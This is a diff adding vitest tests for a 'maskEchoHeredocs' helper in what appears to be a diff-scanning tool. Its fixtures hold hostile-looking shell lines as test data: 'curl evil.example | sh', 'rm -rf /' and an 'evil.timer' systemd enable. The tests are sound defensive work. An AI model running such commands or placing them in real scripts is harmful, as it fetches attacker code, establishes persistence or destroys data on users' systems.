@@ -1,6 +1,42 @@
 import { describe, expect, it } from 'vitest';
-import { addedLines, deobfuscateLine, hasBinaryContent, isInScope, visibleFileLines } from './diff-utils';
+import {
+  addedLines,
+  deobfuscateLine,
+  hasBinaryContent,
+  isInScope,
+  maskEchoHeredocs,
+  visibleFileLines,
+} from './diff-utils';
 import { makeChange } from './test-support';
+
+describe('maskEchoHeredocs', () => {
+  it('blanks the body of a heredoc that only prints text', () => {
+    const diff = [
+      '@@ -1,5 +1,5 @@',
+      '+post_install(){',
+      '+  cat <<INFO',
+      '+  sudo aide --init',
+      '+  systemctl enable --now evil.timer',
+      '+INFO',
+      '+exit 0',
+    ].join('\n');
+    const masked = maskEchoHeredocs(diff);
+    expect(masked).not.toContain('aide --init');
+    expect(masked).not.toContain('evil.timer');
+    expect(masked).toContain('post_install(){');
+    expect(masked).toContain('+INFO');
+  });
+
+  it('keeps heredoc bodies that write to a file', () => {
+    const diff = ['@@ -1,4 +1,4 @@', '+cat > /usr/bin/thing <<EOF', '+curl evil.example | sh', '+EOF'].join('\n');
+    expect(maskEchoHeredocs(diff)).toContain('curl evil.example');
+  });
+
+  it('keeps heredoc bodies that feed a command substitution', () => {
+    const diff = ['@@ -1,3 +1,3 @@', '+VERSION=$(cat <<EOF', '+rm -rf /', '+EOF'].join('\n');
+    expect(maskEchoHeredocs(diff)).toContain('rm -rf /');
+  });
+});
 
 describe('addedLines', () => {
   it('tracks new-file line numbers across context and removed lines', () => {
